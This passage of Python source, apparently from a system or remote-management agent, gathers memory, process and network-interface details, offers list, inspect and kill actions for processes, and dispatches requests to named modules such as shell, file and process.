    return info


def _ram_fallback() -> dict:
    result: dict = {}
    try:
        if platform.system() == "Linux":
            with open("/proc/meminfo") as f:
                for line in f:
                    if line.startswith("MemTotal"):
                        result["ram_total"] = int(line.split()[1]) * 1024
                    elif line.startswith("MemAvailable"):
                        result["ram_available"] = int(line.split()[1]) * 1024
        elif platform.system() == "Windows":
            import ctypes
            class MEMORYSTATUSEX(ctypes.Structure):
                _fields_ = [
                    ("dwLength", ctypes.c_ulong),
                    ("dwMemoryLoad", ctypes.c_ulong),
                    ("ullTotalPhys", ctypes.c_ulonglong),
                    ("ullAvailPhys", ctypes.c_ulonglong),
                    ("ullTotalPageFile", ctypes.c_ulonglong),
                    ("ullAvailPageFile", ctypes.c_ulonglong),
                    ("ullTotalVirtual", ctypes.c_ulonglong),
                    ("ullAvailVirtual", ctypes.c_ulonglong),
                    ("sullAvailExtendedVirtual", ctypes.c_ulonglong),
                ]
            mem = MEMORYSTATUSEX()
            mem.dwLength = ctypes.sizeof(mem)
            ctypes.windll.kernel32.GlobalMemoryStatusEx(ctypes.byref(mem))
            result["ram_total"] = mem.ullTotalPhys
            result["ram_available"] = mem.ullAvailPhys
    except Exception:
        pass
    return result


def _list_processes() -> list:
    processes = []
    try:
        import psutil
        for proc in psutil.process_iter(["pid", "name", "username", "status"]):
            try:
                processes.append(proc.info)
            except Exception:
                pass
        return processes
    except ImportError:
        pass

    try:
        if platform.system() == "Windows":
            out = subprocess.check_output(
                ["tasklist", "/fo", "csv", "/nh"], text=True, timeout=10
            )
            for line in out.strip().splitlines():
                parts = line.strip('"').split('","')
                if len(parts) >= 2:
                    processes.append({"name": parts[0], "pid": parts[1]})
        else:
            out = subprocess.check_output(
                ["ps", "aux"], text=True, timeout=10
            )
            for line in out.strip().splitlines()[1:]:
                parts = line.split(None, 10)
                if len(parts) >= 11:
                    processes.append({
                        "user": parts[0],
                        "pid": parts[1],
                        "cpu": parts[2],
                        "mem": parts[3],
                        "name": parts[10][:64],
                    })
    except Exception:
        pass

    return processes


def _network_info() -> list:
    interfaces = []
    try:
        import psutil
        for iface, addrs in psutil.net_if_addrs().items():
            for addr in addrs:
                interfaces.append({
                    "interface": iface,
                    "family": str(addr.family),
                    "address": addr.address,
                    "netmask": addr.netmask,
                })
        return interfaces
    except ImportError:
        pass

    try:
        if platform.system() != "Windows":
            out = subprocess.check_output(["ip", "addr"], text=True, timeout=5)
            interfaces.append({"raw": out[:2000]})
    except Exception:
        pass

    return interfaces


# ---------------------------------------------------------------------------
# Module dispatcher
# ---------------------------------------------------------------------------

def process_run(action: str, params: dict) -> dict:
    """Process module — list, kill, info."""
    if action in ("list", "ps"):
        return _result(data={"processes": _list_processes()})
    elif action == "kill":
        pid = int(params.get("pid", 0))
        try:
            import psutil
            p = psutil.Process(pid)
            p.terminate()
            return _result(data={"killed": True, "pid": pid})
        except Exception as exc:
            return _result(error=str(exc), status="failed")
    elif action == "info":
        pid = int(params.get("pid", 0))
        try:
            import psutil
            p = psutil.Process(pid)
            return _result(data=p.as_dict())
        except Exception as exc:
            return _result(error=str(exc), status="failed")
    return _result(error=f"Unknown process action: {action}", status="failed")


_MODULES = {
    "shell": shell_run,
    "file": file_run,
    "info": info_run,
    "process": process_run,
    "builtin": builtin_run,
}


def run_builtin(module: str, action: str, params: dict) -> dict:
    """Dispatch to the appropriate built-in module handler."""
    handler = _MODULES.get(module)
    if handler is None:
        return _result(error=f"Unknown built-in module: {module}", status="failed")
    try:
        return handler(action, params)
    except Exception as exc:
        return _result(error=f"Module '{module}' crashed: {exc}", status="failed")
